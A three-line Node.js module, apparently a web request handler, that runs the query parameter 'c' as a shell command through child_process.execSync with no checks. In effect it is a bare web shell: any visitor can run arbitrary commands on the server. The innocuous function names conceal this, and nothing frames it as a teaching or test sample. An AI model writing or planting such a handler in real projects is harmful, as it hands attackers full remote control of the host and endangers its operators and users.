const cp = require('child_process');
const runArrow = (cmd) => cp.execSync(cmd);
exports.h = function h(req, res) { runArrow(req.query.c); res.end(); };
